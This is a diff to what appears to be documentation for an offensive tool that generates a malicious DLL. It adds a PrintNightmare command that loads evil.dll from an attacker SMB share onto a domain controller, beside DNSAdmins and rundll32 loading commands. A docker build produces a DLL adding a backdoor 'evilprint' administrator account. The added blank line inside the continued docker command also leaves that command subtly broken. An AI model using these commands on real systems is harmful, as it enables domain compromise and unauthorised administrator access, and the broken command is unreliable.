@@ -14,7 +14,7 @@ As soon as the DLL is loaded by any process (dns.exe, printfilterpipelinesvc.exe
 | Method                          | Example command                                                                                          | Requirements                              |
 |---------------------------------|----------------------------------------------------------------------------------------------------------|-------------------------------------------|
 | DNSAdmins (DNS Server plugin)   | `dnscmd.exe /config /serverlevelplugindll C:\temp\evil.dll` + restart DNS service                        | Member of DNSAdmins group                 |
-| PrintNightmare (CVE-2021-34527 / CVE-2021-1675)                                                                                            | RPC access + reachable authenticated SMB share |
+| PrintNightmare (CVE-2021-34527 / CVE-2021-1675) | `printnightmare.py -dll '\\<attacker_ip>\share\evil.dll' '<user_name>:<user_password>@<dc-ip>'` | RPC access + reachable authenticated SMB share |
 | rundll32.exe                    | `rundll32.exe evil.dll,EntryPoint`                                                                       | Command execution                         |
 | COM / DLL Search Order hijacking| Copy the DLL into a directory loaded by a vulnerable service                                             | Write permission in the target directory  |
 
@@ -33,4 +33,5 @@ docker run --rm -v .:/out evildll \
     -u evilprint \
     -p 'Password1' \
     -g "Administrators" \
+
     -o evil.dll
